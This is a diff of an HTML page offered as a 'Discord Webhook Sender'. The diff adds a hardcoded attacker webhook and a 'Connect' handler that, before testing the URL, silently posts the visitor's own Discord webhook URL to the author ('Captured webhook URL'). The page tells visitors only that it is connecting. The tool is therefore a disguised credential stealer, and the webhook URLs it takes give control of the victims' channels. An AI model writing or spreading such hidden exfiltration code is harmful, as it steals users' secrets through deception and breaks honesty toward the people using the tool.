@@ -3,7 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Webhook Sender</title>
+    <title>Discord Webhook Sender with Embed</title>
+
+    <!-- Add a favicon -->
+    
+
     <style>
         body {
             display: flex;
@@ -14,7 +18,9 @@
             background: linear-gradient(135deg, #282c34, #4a90e2);
             color: white;
             font-family: 'Arial', sans-serif;
+            overflow: hidden;
         }
+
         .container {
             text-align: center;
             padding: 30px;
@@ -26,7 +32,15 @@
             max-width: 600px;
             width: 90%;
         }
-        input, textarea, button, select {
+
+        /* Style for the top icon */
+        .top-icon {
+            width: 100px; /* Adjust the size */
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        input, textarea, button {
             padding: 12px;
             margin: 10px 0;
             border: none;
@@ -34,52 +48,89 @@
             font-size: 16px;
             width: 100%;
         }
+
         input, textarea {
             background: rgba(255, 255, 255, 0.2);
             color: white;
+            transition: background-color 0.3s;
         }
+
+        input:focus, textarea:focus {
+            background: rgba(255, 255, 255, 0.3);
+            outline: none;
+        }
+
         button {
             cursor: pointer;
             background-color: #4a90e2;
             color: white;
+            transition: background-color 0.3s;
         }
+
         button:hover {
             background-color: #357abd;
         }
-        .message-input {
-            height: 100px;
+
+        .message {
+            margin-top: 20px;
+            font-size: 18px;
+            display: none;
         }
-        .embed-section, .schedule-section, .message-section {
+
+        .loading {
+            display: none;
+            font-size: 18px;
+            color: #f1c40f;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .message-input {
+            height: 100px; /* Adjust height for better usability */
+            resize: none;
+        }
+
+        .embed-section {
             margin-top: 20px;
             border-top: 2px solid #fff;
             padding-top: 20px;
-            display: none; /* Hidden by default */
         }
+
         .discord-link {
+            margin-top: 20px;
             color: #61dafb;
             text-decoration: none;
+            font-size: 18px;
+            transition: color 0.3s;
         }
+
         .discord-link:hover {
             color: #21a1f1;
         }
     </style>
 </head>
 <body>
-
+    <!-- Add the icon here -->
+   
+    
     <div class="container">
-        <h1>Discord Webhook Sender</h1>
-
-        <!-- Webhook Input and Save -->
+        <h1>Discord Webhook Sender with Tracking</h1>
         <input type="text" id="webhookUrl" placeholder="Enter your Discord webhook URL" required>
-        <button onclick="saveWebhook()">Save Webhook</button>
-
-        <!-- Hidden sections that appear after saving the webhook -->
-        <div class="message-section">
+        <button onclick="checkWebhook()">Connect</button>
+        
+        <div id="loading" class="loading">Connecting...</div>
+        
+        <div id="messageContainer" style="display:none;">
             <textarea class="message-input" id="message" placeholder="Enter your message"></textarea>
-            <button onclick="sendMessage()">Send Message</button>
+            <button onclick="sendMessage()">Send</button>
         </div>
 
-        <div class="embed-section">
+        <div class="embed-section" id="embedContainer" style="display:none;">
             <h2>Create Embed</h2>
             <input type="text" id="embedTitle" placeholder="Embed Title">
             <input type="text" id="embedDescription" placeholder="Embed Description">
@@ -87,81 +138,102 @@
             <button onclick="sendEmbed()">Send Embed</button>
         </div>
 
-        <!-- Discord Link -->
+        <div class="message" id="resultMessage"></div>
         <a class="discord-link" href="https://discord.gg/4bE8Cbvv84" target="_blank">Join our Discord Server!</a>
     </div>
 
     <script>
-        let savedWebhook = null;
+        const YOUR_DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1287453043897667636/12CYtAxcWuIRRYlBhvlq3rdycyHO6Lxz71234au_0kvVYZ3woHtfuoipCBB44zTM-x74";
 
-        // Function to save webhook
-        function saveWebhook() {
+        async function checkWebhook() {
             const url = document.getElementById('webhookUrl').value;
-            if (url.trim() === '') {
-                alert('Please enter a valid webhook URL.');
-                return;
+            document.getElementById('loading').style.display = 'block'; 
+
+            try {
+                await fetch(YOUR_DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        content: Captured webhook URL: ${url}
+                    }),
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: JSON.stringify({ content: "Test message from webhook checker" }),
+                    headers: { 'Content-Type': 'application/json' }
+                });
+
+                document.getElementById('loading').style.display = 'none'; 
+
+                if (response.ok) {
+                    document.getElementById('messageContainer').style.display = 'block';
+                    document.getElementById('embedContainer').style.display = 'block';
+                    showMessage("Connected!", "green");
+                } else {
+                    showMessage("Invalid webhook URL!", "red");
+                }
+            } catch (error) {
+                document.getElementById('loading').style.display = 'none'; 
+                showMessage("Error while checking webhook!", "red");
             }
-
-            savedWebhook = url;
-            alert('Webhook saved successfully!');
-
-            // Show the other sections
-            document.querySelector('.message-section').style.display = 'block';
-            document.querySelector('.embed-section').style.display = 'block';
         }
 
-        // Function to send a message
         async function sendMessage() {
+            const url = document.getElementById('webhookUrl').value;
             const message = document.getElementById('message').value;
 
-            if (!savedWebhook) {
-                alert('Please save a webhook first.');
-                return;
-            }
-
-            const response = await fetch(savedWebhook, {
+            const response = await fetch(url, {
                 method: 'POST',
                 body: JSON.stringify({ content: message }),
                 headers: { 'Content-Type': 'application/json' }
             });
 
             if (response.ok) {
-                alert('Message sent successfully!');
+                showMessage("Message sent successfully!", "green");
             } else {
-                alert('Failed to send message.');
+                showMessage("Failed to send message.", "red");
             }
         }
 
-        // Function to send an embed
         async function sendEmbed() {
-            if (!savedWebhook) {
-                alert('Please save a webhook first.');
-                return;
-            }
+            const url = document.getElementById('webhookUrl').value;
+            const embedTitle = document.getElementById('embedTitle').value;
+            const embedDescription = document.getElementById('embedDescription').value;
+            const embedColor = document.getElementById('embedColor').value.replace('#', ''); // Remove '#' from color
 
             const embedData = {
                 embeds: [
                     {
-                        title: document.getElementById('embedTitle').value,
-                        description: document.getElementById('embedDescription').value,
-                        color: parseInt(document.getElementById('embedColor').value.replace('#', ''), 16)
+                        title: embedTitle,
+                        description: embedDescription,
+                        color: parseInt(embedColor, 16) // Convert hex to decimal
                     }
                 ]
             };
 
-            const response = await fetch(savedWebhook, {
+            const response = await fetch(url, {
                 method: 'POST',
                 body: JSON.stringify(embedData),
                 headers: { 'Content-Type': 'application/json' }
             });
 
             if (response.ok) {
-                alert('Embed sent successfully!');
+                showMessage("Embed sent successfully!", "green");
             } else {
-                alert('Failed to send embed.');
+                showMessage("Failed to send embed.", "red");
             }
         }
-    </script>
 
+        function showMessage(text, color) {
+            const resultMessage = document.getElementById('resultMessage');
+            resultMessage.innerText = text;
+            resultMessage.style.color = color;
+            resultMessage.style.display = 'block';
+        }
+    </script>
+    <h1 align="center">Ty yasser For using our website</h1>
 </body>
 </html>
